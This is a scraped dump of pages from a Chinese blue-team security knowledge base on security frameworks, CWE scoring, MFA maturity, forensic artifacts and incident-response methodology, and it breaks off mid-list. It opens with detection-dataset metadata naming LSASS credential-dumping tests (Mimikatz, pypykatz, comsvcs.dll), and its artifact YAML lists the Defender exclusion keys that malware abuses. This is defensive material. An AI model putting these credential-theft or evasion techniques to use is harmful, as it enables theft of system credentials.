Return value unclear for test T1003.001-3 Dump LSASS.exe Memory using\r\ncomsvcs.dll Successful Execution of test T1003.001-4 Dump LSASS.exe Memory using\r\ndirect system calls and API unhooking Return value unclear for test T1003.001-6\r\nOffline Credential Theft With Mimikatz Return value unclear for test T1003.001-7\r\nLSASS read with pypykatz '\r\nenvironment: attack_range\r\ntechnique:\r\n- T1003.001\r\ndataset:\r\n- https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1003.001/atomic_red_team/windows-powershell.log\r\n- https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1003.001/atomic_red_team/windows-security.log\r\n- https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1003.001/atomic_red_team/windows-sysmon.log\r\n- https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1003.001/atomic_red_team/windows-system.log\r\nreferences:\r\n- https://attack.mitre.org/techniques/T1003/001/\r\n- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md\r\n- https://github.com/splunk/security-content/blob/develop/tests/T1003_001.yml\r\nsourcetypes:\r\n- XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\r\n- WinEventLog:Microsoft-Windows-PowerShell/Operational\r\n- WinEventLog:System\r\n- WinEventLog:Security\r\n```\r\n\r\n# 6. 参考资料\r\n- [https://github.com/splunk/attack_data](https://github.com/splunk/attack_data)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/安全架构/如何选择网络安全框架/","title":"如何选择网络安全框架"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 如何选择网络安全框架\r\ntags:\r\n- Blue Team能力建设\r\n- 安全架构\r\n- Lapsus$\r\n- Conti\r\n- SolarWinds\r\n---\r\n\r\n# 1. 背景\r\n当老板提出灵魂拷问时，我们能否从容回答？\r\n\r\n- [[Lapsus$组织的手法]] | [[勒索犯罪团伙Conti]] | [[SolarWinds事件]] 等等回发生在我们身上吗？我们的风险有多大？我们是否能保护了我们的关键资产？未来我们需要做什么？网络安全如何与业务战略保持一致？\r\n\r\n我们可以协助网络安全框架来回答这些挑战\r\n\r\n# 2. 框架概述\r\n我们可以把框架分为三类\r\n- **控制框架 Control Framework**\r\n  > 类比：如果你想成为一名作家，就必须首先从对语言和词汇的掌握开始，可以在写作中使用的单词都包含在字典中。同样，可以实现的安全控制都在各种控制框架中都有描述。\r\n  \r\n  - NIST 800-53\r\n    - 包含您可能想要实施的所有可能的安全控制。显然，不能也不想实现每一个可能的控制。这就是 NIST 800-53 将控制分为低、中和高影响类别的原因，以便可以根据自己的情况确定适当的控制。\r\n    \r\n  - CIS Controls\r\n    - 他们定义了“前 20 名”控制措施，这些控制措施已被证明可以缓解绝大多数最常见和最有影响力的安全攻击。\r\n- **计划框架 Program Framework**\r\n  > 类比：作家不会仅仅通过使用字典中最常见的单词而获得成功，他需要知道如何以令他的读者满意的方式将这些词组合在一起。在某些情况下，他可能需要一个风格指南作为编写文档的参考点。计划框架就像一个风格指南。\r\n\r\n  - ISO 27001\r\n    - 一个全面的计划框架，它定义了建立信息安全管理系统 (ISMS) 的要求。包括应该实施的安全控制之外的政策、过程、流程和活动。\r\n\r\n  - NIST CSF\r\n    - 它定义了五个高级功能：识别、保护、检测、响应和恢复。这五个功能将复杂的安全世界分解为简单的类别，这些类别为所有安全活动的高级生命周期建模。因为它很简单，所以它还为安全领导者提供了一种更轻松地就其安全计划进行沟通的方式。\r\n    - [[Google Cloud 安全架构]] 就在很大程度上参考了他。\r\n\r\n- **风险框架 Risk Framework**\r\n  > 类比：一个熟练的作者知道如何讲述一个能引起观众共鸣的故事。同样，风险框架可帮助安全领导者以与业务产生共鸣的方式评估和管理风险。\r\n\r\n  - IOS 27005\r\n  - NIST 800-30/37/39\r\n  - FAIR\r\n\r\n# 3. 全景图\r\n![r6ctjW](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/r6ctjW.jpg)\r\n\r\n# 4. 实战案例\r\n- #待补充\r\n\r\n# 5. 参考\r\n- [https://www.frankkim.net/blog/how-to-make-sense-of-cybersecurity-frameworks](https://www.frankkim.net/blog/how-to-make-sense-of-cybersecurity-frameworks)\r\n- [https://www.youtube.com/watch?v=dt2IqidgpS4](https://www.youtube.com/watch?v=dt2IqidgpS4)\r\n- [https://paleocruiser.medium.com/how-to-choose-a-cybersecurity-framework-431da08d5d81](https://paleocruiser.medium.com/how-to-choose-a-cybersecurity-framework-431da08d5d81)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[Lapsus$组织的手法]: ../../实践参考/Lapsus$组织的手法.md \"Lapsus$组织的手法\"\r\n[勒索犯罪团伙Conti]: ../../实践参考/勒索犯罪团伙Conti.md \"勒索犯罪团伙Conti\"\r\n[SolarWinds事件]: ../../实践参考/SolarWinds事件.md \"SolarWinds事件\"\r\n[Google Cloud 安全架构]: ../../行业观察/Google/Google Cloud 安全架构.md \"Google Cloud 安全架构\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/安全知识库/Blue Team能力建设/安全规范&模型/2021 CWE Top 25 软件脆弱点/","title":"2021 CWE Top 25 软件脆弱点"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 2021 CWE Top 25 软件脆弱点\r\ntags:\r\n- Blue Team能力建设\r\n- 安全规范&模型\r\n- MITRE\r\n- CWE\r\n---\r\n\r\n# 背景\r\n- CWE的全称是Common Weakness Enumeration，列举了过去两年中遇到的最常见和影响最大的软件安全问题。这些脆弱点通常很容易被发现、利用，并且可以让攻击者完全接管系统、窃取数据。 CWE Top 25 是一个宝贵的社区资源，可以帮助开发人员、测试人员和用户——以及项目经理、安全研究人员和教育工作者——深入了解最严重和当前的安全漏洞。 ^eb3843\r\n- CWE 团队利用了美国国家标准与技术研究院 (NIST) 国家漏洞数据库 (NVD) 中的CVE数据以及CVSS分数与每个 CVE 记录相关联。将公式应用于数据，根据出现概率和严重程度对每个脆弱点进行评分。\r\n\r\n# The CWE Top 25\r\n![xAZXnh](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/xAZXnh.jpg)\r\n\r\n- 计算公式\r\n  - 评分公式用于计算脆弱点的排序顺序，该顺序考虑了漏洞出现的频率与严重程度，并对最小值和最大值进行了标准化。\r\n  - **为了确定频率，评分公式计算 CWE 映射到 NVD 内的 CVE 的次数：**\r\n    - Freq = {count(CWE_X’ ∈ NVD) for each CWE_X’ in NVD}\r\n    - Fr(CWE_X) = (count(CWE_X ∈ NVD) - min(Freq)) / (max(Freq) - min(Freq))\r\n  - **评分公式中的另一个组成部分是严重程度，它由映射到特定 CWE 的所有 CVE 的平均 CVSS 分数表示。 下面的等式用于计算该值：**\r\n    - Sv(CWE_X) = (average_CVSS_for_CWE_X - min(CVSS)) / (max(CVSS) - min(CVSS))\r\n  - **然后通过将严重程度的分数乘以频率分数来确定特定 CWE 呈现的排序分数：**\r\n    - Score(CWE_X) = Fr(CWE_X) * Sv(CWE_X) * 100\r\n\r\n# 参考资料\r\n- [http://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html](http://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/安全规范&模型/认证强度成熟度模型 CASMM/","title":"认证强度成熟度模型 CASMM"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 认证强度成熟度模型 CASMM\r\ntags:\r\n- Blue Team能力建设\r\n- 安全规范&模型\r\n- CASMM\r\n---\r\n\r\n# 并非所有的 MFA 都是一样的，他们的差异在于\r\n- ![uSISdK](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/uSISdK.jpg)\r\n- 现在，越来越多的钓鱼攻击不仅提示输入用户名和密码，还提示输入 MFA 信息。这意味着传统的 MFA 在逐渐失效。这就提出了一个问题：是否有一种身份验证方法可以防止这种情况发生？换句话说，是否有一种多因素认证模式可以抵抗网络钓鱼？答案是肯定的。\r\n- FIDO 代表 Fast Identity Online，它使用通用身份验证框架 (UAF) 和通用第二因素 (U2F) 协议。该系统使用公钥加密和物理访问令牌。私钥存储在令牌上并随身携带，而公钥存储在您要对其进行身份验证的服务中。当进行身份验证时，向客户端/token证明你就是你（指纹、PIN、语音等），并且客户端会创建一个发送到服务的签名请求。使用公钥对该请求进行解密和身份验证，这证明该请求是使用私钥发出的，然后就可以通过身份验证。\r\n\r\n# 参考资料\r\n- [https://danielmiessler.com/blog/casmm-consumer-authentication-security-maturity-model/](https://danielmiessler.com/blog/casmm-consumer-authentication-security-maturity-model/)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/应急响应/Windows.Linux.MacOS Cheat Sheet/","title":"Windows.Linux.MacOS Cheat Sheet"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Windows.Linux.MacOS Cheat Sheet\r\ntags:\r\n- Blue Team能力建设\r\n- 应急响应\r\n- Cheat Sheet\r\n---\r\n\r\n# 1. 目录列表\r\n![x87oqi](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/x87oqi.jpg)\r\n\r\n# 2. 参考资料\r\n- [https://www.jaiminton.com/cheatsheet/DFIR](https://www.jaiminton.com/cheatsheet/DFIR)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/应急响应/常用目录/","title":"常用目录"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 常用目录\r\ntags:\r\n- Blue Team能力建设\r\n- 应急响应\r\n---\r\n\r\n# 1. 目录列表\r\n```\r\n  antivirus.yaml \r\n  applications.yaml \r\n  cloud_services.yaml \r\n  config_files.yaml \r\n  containerd.yaml \r\n  docker.yaml \r\n  hadoop.yaml \r\n  installed_modules.yaml \r\n  instant_messaging.yaml \r\n  java.yaml \r\n  kaspersky_careto.yaml \r\n  kubernetes.yaml \r\n  legacy.yaml \r\n  linux.yaml \r\n  linux_proc.yaml \r\n  macos.yaml \r\n  ntfs.yaml \r\n  tomcat.yaml \r\n  unix_common.yaml \r\n  webbrowser.yaml \r\n  webservers.yaml \r\n  windows.yaml \r\n  windows_dll_hijacking.yaml \r\n  wmi.yaml\r\n```\r\n\r\n# 2. 案例 — antivirus.yaml内容如下：\r\n```\r\n  # Anti-Virus artifacts.\r\n  \r\n  name: EsetAVQuarantine\r\n  doc: Eset Anti-Virus Quarantine (Infected) files.\r\n  sources:\r\n  - type: FILE\r\n    attributes: {paths: ['/Library/Application Support/ESET/esets/cache/quarantine/*']}\r\n  supported_os: [Darwin]\r\n  labels: [Antivirus]\r\n  ---\r\n  name: MicrosoftAVQuarantine\r\n  doc: Microsoft Anti-Virus Quarantine (Infected) files.\r\n  sources:\r\n  - type: FILE\r\n    attributes:\r\n      paths:\r\n      - '%%environ_allusersappdata%%\\Microsoft\\Microsoft Antimalware\\Quarantine\\**'\r\n      - '%%environ_allusersappdata%%\\Microsoft\\Windows Defender\\Quarantine\\**'\r\n      separator: '\\'\r\n  supported_os: [Windows]\r\n  labels: [Antivirus]\r\n  ---\r\n  name: MicrosoftAVLogs\r\n  doc: Microsoft Anti-Virus log files.\r\n  sources:\r\n  - type: FILE\r\n    attributes:\r\n      paths:\r\n      - '%%environ_allusersappdata%%\\Microsoft\\Windows Defender\\Support\\MPLog-*.log'\r\n      - '%%environ_allusersappdata%%\\Microsoft\\Windows Defender\\Support\\MPDetection-*.log'\r\n      separator: '\\'\r\n  supported_os: [Windows]\r\n  labels: [Antivirus, Logs]\r\n  ---\r\n  name: WindowsDefenderExclusions\r\n  doc: |\r\n    Directories, processes and extensions configured not to be scanned by Windows Defender.\r\n    The can be set locally or through group policy objects (GPO).\r\n  \r\n    Certain malware families (for example, Tofsee) are known to add directories to the\r\n    Paths list in order to avoid being detected by Windows Defender. Other malware\r\n    (for example, REvil) use the existing exclusions to be ignored by Anti-Virus products.\r\n  sources:\r\n  - type: REGISTRY_KEY\r\n    attributes:\r\n      keys:\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Exclusions\\Processes\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Exclusions\\TemporaryPaths\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Processes\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\*'\r\n      - 'HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\TemporaryPaths\\*'\r\n  supported_os: [Windows]\r\n  urls:\r\n  - 'https://blog.malwarebytes.com/detections/pum-optional-msexclusion/'\r\n  - 'https://answers.microsoft.com/en-us/protect/forum/all/windows-defender-how-to-remove-exclusions/2a0cc465-97b2-46ea-ae77-b87075ed124e'\r\n  - 'https://blog.talosintelligence.com/2019/05/threat-roundup-0503-0510.html'\r\n  - 'https://news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-businesses/'\r\n  ---\r\n  name: SophosAVLogs\r\n  doc: Sophos Anti-Virus log files.\r\n  sources:\r\n  - type: FILE\r\n    attributes: {paths: ['/Library/Logs/Sophos*.log']}\r\n    supported_os: [Darwin]\r\n  - type: FILE\r\n    attributes:\r\n      paths: ['%%environ_allusersappdata%%\\Sophos\\Sophos Anti-Virus\\Logs\\*']\r\n      separator: '\\'\r\n    supported_os: [Windows]\r\n  supported_os: [Darwin, Windows]\r\n  labels: [Antivirus, Logs]\r\n  ---\r\n  name: SophosAVQuarantine\r\n  doc: Sophos Anti-Virus Quarantine (Infected) files.\r\n  sources:\r\n  - type: FILE\r\n    attributes: {paths: ['/Users/Shared/Infected/*']}\r\n    supported_os: [Darwin]\r\n  - type: FILE\r\n    attributes:\r\n      paths: ['%%environ_allusersappdata%%\\Sophos\\Sophos Anti-Virus\\INFECTED\\*']\r\n      separator: '\\'\r\n    supported_os: [Windows]\r\n  supported_os: [Darwin, Windows]\r\n  labels: [Antivirus]\r\n  ---\r\n  name: SymantecAVLogs\r\n  doc: Symantec Anti-Virus Log Files.\r\n  sources:\r\n  - type: FILE\r\n    attributes:\r\n      paths:\r\n      - '%%environ_allusersappdata%%\\Symantec\\Symantec Endpoint Protection\\*\\Data\\Logs\\*.log'\r\n      - '%%environ_allusersappdata%%\\Symantec\\Symantec Endpoint Protection\\*\\Data\\Logs\\AV\\*.log'\r\n      - '%%users.localappdata%%\\Symantec\\Symantec Endpoint Protection\\Logs\\*.log'\r\n      separator: '\\'\r\n    supported_os: [Windows]\r\n  supported_os: [Windows]\r\n  labels: [Antivirus, Logs]\r\n  ---\r\n  name: SymantecAVQuarantine\r\n  doc: Symantec Anti-Virus Quarantine (Infected) files.\r\n  sources:\r\n  - type: FILE\r\n    attributes:\r\n      paths: ['%%environ_allusersappdata%%\\Symantec\\Symantec Endpoint Protection\\**5\\*.vbn']\r\n      separator: '\\'\r\n    supported_os: [Windows]\r\n  supported_os: [Windows]\r\n  labels: [Antivirus, Logs]\r\n```\r\n\r\n# 3. 使用\r\n```\r\n  $WindowsArtifacts=$(curl https://raw.githubusercontent.com/ForensicArtifacts/artifacts/master/data/windows.yaml)\r\n  $obj = ConvertFrom-Yaml $WindowsArtifacts.Content -AllDocuments\r\n  \r\n  $count=0;\r\n  foreach ($Artifact in $obj){\r\n  $Artifacts = [pscustomobject][ordered]@{\r\n  \tName = $obj.name[$count]\r\n  \tDescription = $obj.doc[$count]\r\n  \tReferences = $obj.urls[$count]\r\n  \tAttributes = $obj.sources.attributes[$count]\r\n  }\r\n  $count++;\r\n  $Artifacts | FL;\r\n  }\r\n```\r\n\r\n# 4. 参考资料\r\n- [https://www.jaiminton.com/cheatsheet/DFIR/#disclaimer](https://www.jaiminton.com/cheatsheet/DFIR/#disclaimer)\r\n- [https://github.com/ForensicArtifacts/artifacts/tree/main/data](https://github.com/ForensicArtifacts/artifacts/tree/main/data)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/应急响应/应急响应方法论&框架/","title":"应急响应方法论&框架"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 应急响应方法论&框架\r\ntags:\r\n- Blue Team能力建设\r\n- 应急响应\r\n- 方法论\r\n- 框架\r\n- NIST\r\n- Microsoft\r\n- AWS\r\n---\r\n\r\n#  1. 行业规范\r\nNIST Computer Security Incident Handling Guide\r\n\r\n- ![0Pwx5l](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/0Pwx5l.jpg)\r\n- 应急响应是一组用于在发生安全事件时**准备、检测、控制、响应和学习的过程管理。**\r\n- 事件响应（与大多数网络防御一样）由三大支柱支撑：**技术、人员和流程。**\r\n- **安全事件发生后，业务的主要目标是尽快以安全的方式恢复正常。**\r\n- 我们可能必须回答以下问题：\r\n  - 什么被控制/泄露/破坏了？\r\n  - 如何恢复正常？\r\n  - 这是怎么发生的？\r\n  - 我们如何防止这种情况再次发生？\r\n- 这就是为什么用来衡量应急响应团队绩效的**关键指标是MTTD和MTTR**的原因：\r\n  - **MTTD平均检测时间：**发现事件正在发生所需的时间。\r\n  - **MTTR平均响应时间：**修复威胁所需的时间。\r\n- **整体流程可以分为：**\r\n  - Preparation：人员，过程，技术三个维度展开\r\n  - Detection and Analysis：监控告警、主动发现（威胁狩猎）和分析处置\r\n  - Containment, Eradication, and Recovery：止损并恢复任何受影响的资源、数据和/或流程\r\n  - Post-Incident Activity\r\n    - 经验教训\r\n    - 过程分析：处置时间、主观/客观评价、\r\n    - 证据保留\r\n\r\nISO/IEC 27035\r\n\r\n- ![eoPGpA](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/eoPGpA.jpg)\r\n- 目标与范围\r\n  - 与网络安全相关的攻击不断演变，也对实体造成更多损害。因此，每个组织都需要有一个一致的事件响应计划 (IRP) 和事件管理技能，以根据风险评估的结果减轻弱点、保持业务运行、最大限度地减少损失和声誉。通过这种方式，它有助于减少发生的事件，同时要记住并非所有事件都可以预防。\r\n  - ISO (27035:2016) 国际标准为大中型组织提供信息安全事件管理发布的指南、技术和最佳实践。除了小型组织可以遵循基本程序集和推荐的国际事件管理实践外，还可以提供外部各方来处理信息安全事件。\r\n- **信息安全事件链**见下图：\r\n  - ![xqhOZq](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/xqhOZq.jpg)\r\n- 常见安全响应团队的类型如下：\r\n  - ![Uo6lq1](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/Uo6lq1.jpg)\r\n- 整体流程可以分为：\r\n  - Plan & Prepare：为事件管理政策计划和准备适当的计划，并考虑将事件管理、漏洞管理计划纳入此阶段，包括整体流程、政策、操作工具、模板、角色和职责。\r\n  - Identify. Detect, &Report：该过程检测、收集与安全事件相关的信息并报告安全事件，信息安全事件和事件流程图如下：\r\n    - ![5dEPex](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/5dEPex.jpg)\r\n  - Assessment & Decision：进行评估以确定安全事件是否处于可能性或误报状态，或已结束。ISIRT 进行评估以确认 PoC 的评估结果，以了解事件的真假；应根据结果进行二次评估。\r\n  - Responses：有响应都是根据决策阶段的输出做出的，可以在实时基础上或在取证分析操作的帮助下在确定的时间范围内立即做出响应。\r\n  - Lessons learnt：包括信息安全取证分析、确定经验教训、改进信息安全控制实施和信息安全风险评估和管理审查结果、信息安全事件管理计划和其他改进。\r\n\r\n# 2. 行业实践\r\n## 2.1. AWS\r\n整体流程为：\r\n- 准备阶段\r\n  - 人员：尽管自动化程度有所提高，但安全组织内的分析师和响应者仍有许多工作要做。同质化的团队会产生盲点，因此必须建立一个多元化的团队，在复杂多变的情况下提供不同的思想体系、文化视角以及工作和生活经验。包括：确定角色和职责、响应机制等\r\n  - 技术：使用AWS提供的相关工具/接口访问事件所涉及的环境和资源\r\n- 模拟阶段\r\n  - 安全事件响应模拟 (SIRS) ，可提供结构化机会在现实场景中练习事件响应计划和程序\r\n- 持续迭代\r\n  - 创建Runbook：提前计划并定义自己的安全响应程序，参考[这里](https://github.com/aws-samples/aws-incident-response-playbooks/blob/0d9a1c0f7ad68fb2c1b2d86be8914f2069492e21/runbooks/runbook%20sample%20-%20credential%20leakage.md)\r\n  - 自动化能力：AWS提供了一整套API和工具来实现自动化应急响应，不同的工具对比如下：例如，AWS Lambda 提供更快的速度并且需要更少的技术技能。AWS Fargate 提供更大的灵活     性，并且需要更少的维护和技术技能。\r\n  - ![kALK8g](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/kALK8g.jpg)\r\n\r\n## 2.2. Microsoft\r\n- 核心衡量指标为：**平均确认时间 (MTTA)** 和 **平均补救时间 (MTTR)**\r\n- 响应计划，见下表\r\n\r\n| 活动                     | 描述                                                         | 益处                                                         |\r\n| ------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\r\n| 桌面练习                 | 对可预见的影响业务的网络事件进行周期性的桌面练习，迫使您的组织的管理层考虑基于风险的困难决策。 | 牢固确立并说明网络安全是一个业务问题。发展肌肉记忆，并在整个组织中发现困难的决策和决策权问题。 |\r\n| 确定攻击前决策和决策者   | 作为对桌面练习的补充，确定基于风险的决策、决策标准以及必须由谁来制定和执行这些决策。例如：谁/何时/是否向执法部门寻求帮助？谁/何时/如果招募事件响应者？谁/何时/是否支付赎金？谁/何时/如果通知外部审计师？谁/何时/如果通知隐私监管机构？谁/何时/如果通知证券监管机构？谁/何时/如果通知董事会或审计委员会？谁有权关闭关键任务工作负载？ | 定义初始响应参数和联系人，以简化对事件的响应。               |\r\n| 维护特权                 | 一般来说，建议可以享有特权，但事实是可以发现的。培训关键事件负责人在特权下交流建议、事实和意见，以便保留特权并降低风险。 | 考虑到包括电子邮件、协作平台、聊天、文档、工件在内的众多通信渠道，维护特权可能是一个混乱的过程。例如，您可以使用Microsoft Teams Rooms。事件人员和支持外部组织的一致方法可以帮助减少任何潜在的法律风险。 |\r\n| 内幕交易注意事项         | 考虑向管理层发出通知，以减少证券违规风险。                   | 董事会和外部审计师往往会意识到，您可以采取缓解措施来降低动荡时期出现可疑证券交易的风险。 |\r\n| 事件角色和责任手册       | 建立基本的角色和职责，使各种流程保持专注并向前推进。当您的响应团队处于远程位置时，可能需要额外考虑时区并适当地移交给调查人员您可能必须在可能涉及的其他团队之间进行沟通，例如供应商团队。 | 技术事件负责人——始终在事件中，综合输入和发现并计划下一步行动。沟通联络——消除技术事件负责人与管理层沟通的负担，这样他们就可以继续参与事件而不会失去焦点。这应该包括管理高管信息和互动以及监管机构等其他第三方。事件记录器——消除了事件响应者记录调查结果、决策和行动的负担，并从头到尾准确地记录了事件。远期规划师– 与任务关键型业务流程所有者合作，制定业务连续性活动和准备工作，以考虑持续 24、48、72、96 小时或更长时间的信息系统损害。公共关系——如果发生可能引起公众关注的事件，并与 Forward Planner 一起，考虑并起草解决可能结果的公共沟通方法。 |\r\n| 隐私事件响应手册         | 为了满足日益严格的隐私法规，在 SecOps 和隐私办公室之间制定一个共同拥有的剧本，以便快速评估由安全事件引起的有合理概率的潜在隐私问题。 | 评估安全事件对隐私的潜在影响是很困难的，因为大多数安全事件都发生在技术含量高的 SOC 中，必须迅速将其提交给确定监管风险的隐私办公室，通常需要 72 小时通知。 |\r\n| 渗透测试                 | 针对关键业务系统、关键基础设施和备份进行时间点模拟攻击，以识别安全态势中的弱点。这通常由一个外部专家团队执行，专注于绕过预防性控制并发现关键漏洞。 | 鉴于最近发生的人为勒索软件事件，应针对范围扩大的基础设施进行渗透测试，特别是攻击和控制关键任务系统和数据备份的能力。 |\r\n| 红队/蓝队/紫队/绿队      | 对关键业务系统、关键基础设施、备份进行连续或定期模拟攻击，以识别安全态势中的弱点。这通常由内部攻击团队（红队）进行，他们专注于测试检测控制和团队（蓝队）的有效性。例如，您可以使用Microsoft 365 Defender for Office 365 的攻击模拟培训和Microsoft 365 Defender for Endpoint 的攻击教程和模拟。 | 红色、蓝色和紫色团队攻击模拟，如果做得好，有多种用途：1、允许整个 IT 组织的工程师模拟对他们自己的基础设施学科的攻击。2、表面可见性和检测方面的差距。3、全面提高安全工程技能；作为一个更连续和扩展的过程。绿色团队实施 IT 或安全配置的更改。 |\r\n| 业务连续性规划           | 对于任务关键型业务流程，设计和测试连续性流程，使最小的可行业务在信息系统受损期间能够正常运行。例如，使用Azure 备份和恢复计划在攻击期间保护您的关键业务系统，以确保您的业务运营快速恢复。 | 强调没有针对 IT 系统受损或缺失的连续性解决方法这一事实。与简单的备份和恢复相比，可以强调复杂的数字弹性的需求和资金。 |\r\n| 灾难恢复                 | 对于支持关键业务流程的信息系统，您应该设计和测试热/冷和热/温备份和恢复方案，包括分段时间。 | 进行裸机构建的组织经常发现无法复制或不符合服务水平目标的活动。多次在不受支持的硬件上运行的关键任务系统无法恢复到现代硬件。备份的还原通常未经测试并且会遇到问题。备份可能会进一步脱机，因此暂存时间未计入恢复目标。 |\r\n| 带外通信                 | 准备好在电子邮件和协作服务受损、文档库被勒索以及人员电话号码不可用时如何沟通。 | 尽管这是一项困难的工作，但要确定存储电话号码、拓扑、构建文档和 IT 恢复过程的资源的离线和不可变副本如何存储在离线设备和位置上并大规模分发。 |\r\n| 硬化、卫生和生命周期管理 | 根据 Internet 安全中心 (CIS) 的 20 大安全控制措施，强化您的基础架构并执行彻底的卫生活动。 | 为应对最近发生的人为勒索软件事件，Microsoft发布了具体指南，以加强和保护网络攻击杀伤链的每个阶段，无论是利用 Microsoft 的能力还是其他提供商的能力。特别值得注意的是：1、在系统被勒索的情况下创建和维护不可变的备份副本。您可能还会考虑如何保留不可变的日志文件，这会使对手掩盖其踪迹的能力变得复杂。2、与用于灾难恢复的不受支持的硬件相关的风险。 |\r\n| 事件响应计划             | 在事件开始时，决定：1、重要的组织参数；2、重要的组织参数；3、紧迫感（例如 24x7 和营业时间）；4、工作人员在此期间的可持续性。 | 有一种趋势是在一开始就将所有可用资源投入到事件中，并希望快速解决。一旦您认识到或预计事件会持续很长时间，请与您的员工和供应商采取不同的姿态，让他们能够适应更长时间。 |\r\n| 事件响应者               | 彼此建立明确的期望。报告正在进行的活动的流行格式包括：1、我们做了什么（结果如何）？2、我们在做什么（以及将产生什么结果以及何时产生）？我们下一步计划做什么（什么时候可以期待结果）？ | 事件响应者采用不同的技术和方法，包括死箱分析、大数据分析以及产生增量结果的能力。从明确的期望开始将有助于清晰的沟通。 |\r\n\r\n\t- 相关流程：响应->恢复->运营\r\n\t- 响应手册：如，[钓鱼响应手册](https://docs.microsoft.com/en-us/security/compass/incident-response-playbook-phishing)\r\n\r\n- Microsoft 365 Defender 的事件响应\r\n  - 检测\r\n    -  ![NRDjkn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/NRDjkn.jpg)\r\n  - 工作流程\r\n    - ![MyaocH](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/MyaocH.jpg)\r\n  - 安全操作\r\n    - ![Dvns8r](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/Dvns8r.jpg)\r\n  - 自动化响应\r\n    - 自动调查和响应功能通过以下方式帮助您的安全运营团队：\r\n      - 确定威胁是否需要采取行动。\r\n      - 采取（或建议）任何必要的补救措施。\r\n      - 确定是否以及应该进行哪些其他调查。\r\n      - 根据需要对其他警报重复该过程。\r\n    - 警报会创建一个事件，该事件可以启动自动调查。自动调查会为每条证据做出裁决。判决可以是：\r\n      - 恶意的\r\n      - 可疑的\r\n      - 没有发现威胁\r\n    - 识别恶意或可疑实体的补救措施。补救措施的示例包括：\r\n      - 将文件发送到隔离区\r\n      - 停止进程\r\n      - 隔离设备\r\n      - 阻止 URL\r\n      - 其他行为\r\n  - 有关详细信息，请参阅 [Microsoft 365 Defender 中的补救措施](https://docs.microsoft.com/en-us/microsoft-365/security/defender/m365d-remediation-actions?view=o365-worldwide)\r\n\r\n  # 3. 总结\r\n  应急响应有**五个关键事项：**\r\n\r\n  - 记录在发生事故时要采取的考虑、决定和行动的**过程**\r\n    - **应急响应计划:**详细说明组织（或者，通常是组织的特定部分，例如 SOC）为响应网络事件所做的工作的总体文档\r\n    - **技术操作手册:**技术操作手册提供了有关一线团队（例如 SOC 或 CSIRT）在发生特定事件场景时应如何响应的详细指导（如：https://github.com/certsocietegenerale/IRM/tree/master/EN）\r\n    - **知识库:**提供了有关支持对一个或多个事件场景的响应的具体操作的详细指导\r\n  - 熟练和经验丰富的人员来领导、协调和执行对事件的响应\r\n    - 不仅是必要的技能和经验，还包括更广泛的网络安全、IT 和业务等相关能力，可以参考：\r\n      - [NIST 网络安全劳动力框架](https://niccs.cisa.gov/workforce-development/cyber-security-workforce-framework)\r\n      - [知道创宇研发技能表](https://blog.knownsec.com/Knownsec_RD_Checklist/index.html)\r\n      - 